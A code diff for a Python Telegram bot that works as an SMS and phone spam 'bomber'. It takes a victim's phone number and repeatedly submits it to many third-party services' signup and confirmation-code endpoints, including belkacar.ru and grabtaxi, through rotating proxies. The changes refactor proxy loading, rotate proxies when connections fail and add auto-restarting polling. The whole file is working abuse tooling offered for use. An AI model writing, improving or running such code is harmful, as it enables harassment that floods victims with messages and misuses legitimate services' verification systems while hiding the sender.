@@ -7,6 +7,8 @@ import telebot
 import time
 import random
 from pprint import pprint
+from sparser import Parser
+
 
 TOKEN = ''
 
@@ -14,24 +16,16 @@ THREADS_LIMIT = 700
 
 chat_ids_file = 'chat_ids.txt'
 
-ADMIN_CHAT_ID = 0000000000
+ADMIN_CHAT_ID = 000000000
 COUNT_SERV = 62
 
 users_amount = [0]
 threads = list()
 THREADS_AMOUNT = [0]
 types = telebot.types
+parser = Parser()
 
-def load_proxies():
-	import sparser as parser
-	parser.main()
-	proxies = {}
-	with open("proxies.txt", "r") as file:
-		for x in file.read().split("]"):
-			if x.strip() != "": proxies["https"] = x
-	return proxies
-
-apihelper.proxy = load_proxies()
+apihelper.proxy = {"https": random.choice(parser.load_proxies())}
 bot = TeleBot(TOKEN)
 running_spams_per_chat_id = []
 
@@ -107,8 +101,8 @@ def send_for_number(phone):
 	_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
 
 	iteration = 0
-
-	proxies = load_proxies()
+	count = 0
+	proxies = {"https": random.choice(parser.load_proxies())}
 	while True:
 		_email = _name+f'{iteration}'+'@gmail.com'
 		try:
@@ -178,7 +172,9 @@ def send_for_number(phone):
 			requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={}, proxies=proxies)
 			requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}, proxies=proxies)
 		except requests.exceptions.ConnectionError:
-			print("Умер один сервис")
+			count += 1
+			print(f"Умер {count} сервис")
+			proxies = random.choice(parser.load_proxies())
 
 def start_spam(chat_id, phone_number, force):
 	running_spams_per_chat_id.append(chat_id)
@@ -197,7 +193,7 @@ def start_spam(chat_id, phone_number, force):
 	bot.send_message(chat_id, f'Спам на номер {phone_number} завершён')
 	THREADS_AMOUNT[0] -= 1
 	try:
-		running_spams_per_cзнhat_id.remove(chat_id)
+		running_spams_per_chat_id.remove(chat_id)
 	except Exception:
 		pass
 
@@ -261,5 +257,13 @@ def handle_message_received(message):
 		bot.send_message(chat_id, f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
 		print(f'Номер введен неправильно. Введено {len(text)} символов, ожидается 11')
 
+def main():
+	try:
+		bot.polling(none_stop=True)
+	except requests.exceptions.ConnectTimeout:
+		apihelper.proxy = {"https": random.choice(parser.load_proxies())}
+		main()
+
+
 if __name__ == '__main__':
-	bot.polling(none_stop=True)
+	main()
